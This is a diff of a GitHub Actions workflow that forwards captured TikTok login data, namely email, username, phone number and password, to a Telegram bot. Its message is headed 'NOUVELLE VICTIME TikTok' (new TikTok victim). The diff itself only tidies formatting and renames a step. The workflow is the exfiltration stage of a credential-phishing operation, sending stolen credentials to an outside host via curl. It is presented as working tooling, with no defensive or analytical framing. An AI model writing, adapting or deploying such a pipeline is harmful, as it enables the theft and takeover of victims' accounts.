@@ -1,16 +1,14 @@
 name: Send to Telegram
-
 on:
   repository_dispatch:
     types: [login-capture]
-
 jobs:
   send:
     runs-on: ubuntu-latest
     steps:
-      - name: Send to Telegram
+      - name: Send message
         run: |
           curl -s -X POST https://api.telegram.org/bot${{ secrets.BOT_TOKEN }}/sendMessage \
             -d chat_id=${{ secrets.CHAT_ID }} \
             -d parse_mode=HTML \
-            -d text="<b>NOUVELLE VICTIME TikTok</b>%0A%0AEmail: <code>${{ github.event.client_payload.email }}</code>%0AUsername: <code>${{ github.event.client_payload.username }}</code>%0APhone: <code>${{ github.event.client_payload.phone }}</code>%0APassword: <code>${{ github.event.client_payload.password }}</code>%0A%0AHeure: $(date '+%Y-%m-%d %H:%M:%S') UTC"
+            -d text="<b>NOUVELLE VICTIME TikTok</b>%0A%0AEmail: <code>${{ github.event.client_payload.email }}</code>%0AUsername: <code>${{ github.event.client_payload.username }}</code>%0APhone: <code>${{ github.event.client_payload.phone }}</code>%0APassword: <code>${{ github.event.client_payload.password }}</code>%0AHeure: $(date '+%Y-%m-%d %H:%M:%S') UTC"
